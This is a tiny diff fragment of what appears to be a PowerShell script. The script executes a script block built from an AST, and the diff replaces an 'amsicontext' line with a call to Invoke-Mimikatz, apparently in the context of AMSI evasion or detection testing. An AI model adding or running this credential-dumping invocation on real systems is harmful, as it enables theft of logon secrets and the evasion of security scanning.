@@ -11,4 +11,4 @@ $Sb = $Ast.GetScriptBlock()
 
 & $Sb
 
-amsicontext
+Invoke-Mimikatz
